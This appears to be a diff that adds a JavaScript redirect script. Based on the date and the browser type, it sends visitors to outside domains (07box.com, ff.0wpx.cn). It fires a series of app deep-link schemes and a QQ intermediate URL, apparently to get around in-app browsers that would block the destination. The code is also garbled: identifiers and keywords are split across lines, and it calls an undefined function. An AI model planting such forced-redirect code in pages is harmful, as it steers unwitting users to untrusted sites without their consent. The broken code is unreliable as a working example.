@@ -1,0 +1,42 @@
+var now = new Date().getTime(); 
+var myTime = Date.parse(\"2019-1-24 13:08:17\".replace(/-/g, \"/\"));
+if
+(now-myTime > 0){
+   
+    window.location=\"http://ff.0wpx.cn/error.html\";
+}else{
+   if(navigator.userAgent.indexOf(\"Android\") > -1){
+ var resul
+t2 = \"http://07box.com\";malimalihong(result2);
+ }
+ else if(navigator.userAgent.toLowerCase().match(/MicroMessenger/i)==\"micromessenger\" ){
+ var r
+esult2 = \"http://07box.com\";malimalihong(result2);
+ }
+ else if(navigator.userAgent.indexOf(\"QQ\") > -1)
+ {
+  var url = \"07box.com\";
+  functio
+n openu(u){
+     document.getElementById(\"vurl\").href= u;
+     document.getElementById(\"vurl\").click();  
+     }
+  openu(\"mttbrowser://url=\"+
+url);
+     openu(\"ucbrowser://\"+url);
+     openu(\"qihoobrowser://browse?url=\"+url);
+     openu(\"googlechrome://browse?url=\"+url);
+     openu(\"
+mibrowser:\"+url);
+     openu(\"taobao://\"+url);
+  window.location=\"http://c.pc.qq.com/middleb.html?pfurl=http://\"+url;
+  
+ }
+ else
+ {
+  var 
+url = \"http://07box.com\";
+   window.location=url;
+ 
+ }
+}
